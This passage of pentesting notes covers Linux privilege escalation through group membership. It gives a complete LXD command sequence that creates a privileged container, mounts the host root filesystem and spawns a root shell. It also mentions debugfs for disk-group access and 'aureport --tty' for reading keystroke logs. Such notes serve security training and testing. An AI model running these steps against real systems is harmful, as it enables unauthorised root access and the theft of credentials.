
## LXC/LXD

Membership of [LXD](https://github.com/lxc/lxd) can be used to escalate privileges by creating an LXD container, making it privileged, and accessing the host file system at `/mnt/root`. Let's confirm group membership and use these rights to escalate to root.

[lxd initalization](https://www.digitalocean.com/community/tutorials/how-to-set-up-and-use-lxd-on-ubuntu-16-04), Upon installation, all users are added to the LXD group.

```sh
unzip alpine.zip ### unzip apline image

lxd init ### starting LXD initialization process 

lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine 
### import image

lxc init alpine r00t -c security.privileged=true 
### no UID mapping with privileged=true -> same root

lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true 
### mounting host FS, root dir is /mnt/root/root

lxc start r00t ### booting

lxc exec r00t /bin/sh ### spawning shell 
```

---
## Disk

Users within the disk group have full access to any devices contained within `/dev`, 

An attacker with these privileges can use `debugfs` to access the entire file system with root level privileges. 

---
## ADM

Members of the `adm` group are able to read all logs stored in `/var/log`. `aureport` command can read audit log and also keystroke audit. `aureport --tty`

---